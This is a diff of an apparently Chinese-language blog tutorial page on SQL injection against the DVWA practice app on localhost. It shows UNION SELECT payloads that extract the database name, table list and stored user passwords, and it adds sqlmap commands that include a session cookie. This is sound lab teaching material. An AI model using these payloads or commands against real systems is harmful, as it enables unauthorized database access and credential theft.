@@ -140,6 +140,16 @@
 <h5 id="2、联合查询其他信息-union-select-sql1-sql2"><a href="#2、联合查询其他信息-union-select-sql1-sql2" class="headerlink" title="2、联合查询其他信息  union select [sql1] [sql2]"></a>2、联合查询其他信息  union select [sql1] [sql2]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p>
 <h5 id="3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’"><a href="#3、联合查询表-union-select-table-name-table-schema-from-information-schema-tables-where-table-schema-‘-database-name-’" class="headerlink" title="3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’"></a>3、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p>
 <h5 id="4、联合查询信息-union-query-sql"><a href="#4、联合查询信息-union-query-sql" class="headerlink" title="4、联合查询信息  union [query_sql]"></a>4、联合查询信息  union [query_sql]</h5><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p>
+<h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/sqli&quot;">http://127.0.0.1/vulnerabilities/sqli&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p>
+<p>cookie信息怎么看：</p>
+
+    <figure class="figure-image">
+      <img src="/picture/web1.png" alt="" loading="lazy" />
+      <figcaption></figcaption>
+    </figure>
+  
+
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p>
 
       </section>
 
@@ -210,7 +220,7 @@
         <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
 </svg>
-        <span>14</span>
+        <span>15</span>
       </div>
       <div class="count-box--item">
         <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
